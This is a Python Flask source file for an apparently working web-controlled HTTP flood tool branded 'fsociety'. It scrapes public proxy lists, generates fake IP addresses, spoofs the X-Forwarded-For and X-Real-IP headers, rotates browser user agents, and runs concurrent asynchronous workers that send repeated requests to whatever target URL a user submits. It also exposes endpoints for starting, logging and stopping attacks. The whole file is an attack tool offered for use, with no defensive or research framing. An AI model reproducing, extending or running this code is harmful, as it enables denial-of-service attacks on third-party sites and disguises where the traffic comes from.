from flask import Flask, render_template, request, jsonify, session
import asyncio
import aiohttp
import random
import re
import itertools
import string
import time
import threading
import os

app = Flask(__name__)
app.secret_key = 'fsociety_hardcore_2024'

# USER AGENTS MASIVOS (reducidos para hosting)
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
]

# PROXY SOURCES REALES
proxy_sources = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt"
]

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_id_counter = 0

    def generate_attack_id(self):
        self.attack_id_counter += 1
        return f"attack_{self.attack_id_counter}"

attack_manager = AttackManager()

async def fetch_ip_addresses(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10, ssl=False) as response:
                text = await response.text()
                ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
                return ip_addresses
    except:
        return []

async def get_all_ips():
    tasks = [fetch_ip_addresses(url) for url in proxy_sources]
    ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
    
    all_ips = []
    for sublist in ip_lists:
        if isinstance(sublist, list):
            all_ips.extend(sublist)
    
    # Generar IPs falsas como respaldo
    fake_ips = [f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(200)]
    all_ips.extend(fake_ips)
    
    return all_ips

async def send_request(session, target_url, ip_address):
    headers = {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": ip_address,
        "X-Real-IP": ip_address,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com/",
        "DNT": "1"
    }
    
    try:
        async with session.get(target_url, headers=headers, timeout=5, ssl=False) as response:
            return f"🔥 {target_url} | IP: {ip_address} | Status: {response.status}"
    except Exception as e:
        return f"💥 {target_url} | IP: {ip_address} | Error: {type(e).__name__}"

async def run_attack(target_url, num_requests, attack_id, log_callback):
    max_concurrent = 50  # Reducido para hosting
    
    ip_list = await get_all_ips()
    if not ip_list:
        ip_list = [f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(100)]
    
    ip_cycle = itertools.cycle(ip_list)
    requests_per_worker = max(1, num_requests // max_concurrent)

    async def worker():
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            for _ in range(requests_per_worker):
                if attack_id not in attack_manager.active_attacks:
                    break
                    
                message = await send_request(session, target_url, next(ip_cycle))
                log_callback(message)
                await asyncio.sleep(0.1)  # Delay entre requests

    start_time = time.time()
    
    # Crear workers
    workers = min(max_concurrent, num_requests)
    tasks = [worker() for _ in range(workers)]
    
    try:
        await asyncio.gather(*tasks)
    except Exception as e:
        log_callback(f"❌ Attack error: {str(e)}")
    
    elapsed_time = time.time() - start_time
    log_callback(f"✅ ATTACK COMPLETED - Time: {elapsed_time:.2f}s - Target: {target_url}")

def start_attack_thread(target_url, num_requests, attack_id, log_callback):
    def run_async():
        asyncio.run(run_attack(target_url, num_requests, attack_id, log_callback))
    
    thread = threading.Thread(target=run_async)
    thread.daemon = True
    thread.start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target_url = data.get('target_url', '').strip()
    num_requests = int(data.get('num_requests', 100))
    
    if not target_url:
        return jsonify({'error': 'Target URL required'}), 400
    
    # Validar URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    attack_id = attack_manager.generate_attack_id()
    
    # Inicializar logs en sesión
    if 'attack_logs' not in session:
        session['attack_logs'] = {}
    
    session['attack_logs'][attack_id] = []
    session.modified = True
    
    def log_callback(message):
        if attack_id in session.get('attack_logs', {}):
            session['attack_logs'][attack_id].append(message)
            # Mantener solo últimos 100 logs
            if len(session['attack_logs'][attack_id]) > 100:
                session['attack_logs'][attack_id] = session['attack_logs'][attack_id][-100:]
            session.modified = True
    
    attack_manager.active_attacks[attack_id] = {
        'target_url': target_url,
        'num_requests': num_requests,
        'start_time': time.time()
    }
    
    start_attack_thread(target_url, num_requests, attack_id, log_callback)
    
    return jsonify({
        'attack_id': attack_id,
        'message': '🔥 ATTACK STARTED!'
    })

@app.route('/get_logs/<attack_id>')
def get_logs(attack_id):
    logs = session.get('attack_logs', {}).get(attack_id, [])
    return jsonify({'logs': logs})

@app.route('/stop_attack/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    if attack_id in attack_manager.active_attacks:
        del attack_manager.active_attacks[attack_id]
    return jsonify({'message': 'Attack stopped'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)